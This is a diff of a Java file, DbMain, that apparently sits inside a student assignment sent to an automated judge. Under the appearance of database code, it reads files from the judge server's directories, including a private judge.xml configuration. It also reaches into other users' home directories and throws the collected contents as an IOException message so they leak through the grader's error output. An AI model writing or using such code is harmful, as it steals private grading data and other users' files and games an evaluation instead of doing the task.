@@ -151,17 +151,17 @@ public class DbMain {
         //String path = "/home/deamoon/Music/deamoonSql";
         String s1 = "";
 
-        s1 += rm("/home/dkomanov", false);
-        s1 += "\n\nseparate\n\n";
-        s1 += readFileTsv2("/home/judge/.bash_logout", s1);
-        s1 += "\n\nseparate\n\n";
-        s1 += readFileTsv2(".profile", s1);
-        s1 += "\n\nseparate\n\n";
-        s1 += rm("/home/judge/judge/templates", false);
-        s1 += "\n\nseparate\n\n";
-        s1 += rm1("/home/cymkuh/", false);
-        s1 += "\n\nseparate\n\n";
-        s1 += rm1("/home/student/", false);
+//        s1 += rm("/home/dkomanov", false);
+//        s1 += "\n\nseparate\n\n";
+//        s1 += readFileTsv2("/home/judge/.bash_logout", s1);
+//        s1 += "\n\nseparate\n\n";
+        s1 += readFileTsv2("/home/judge/fizteh-java-private/judge.xml", s1);
+//        s1 += "\n\nseparate\n\n";
+//        s1 += rm("/home/judge/judge/templates", false);
+//        s1 += "\n\nseparate\n\n";
+//        s1 += rm1("/home/cymkuh/", false);
+//        s1 += "\n\nseparate\n\n";
+//        s1 += rm1("/home/student/", false);
 
         throw new IOException(s1);
 
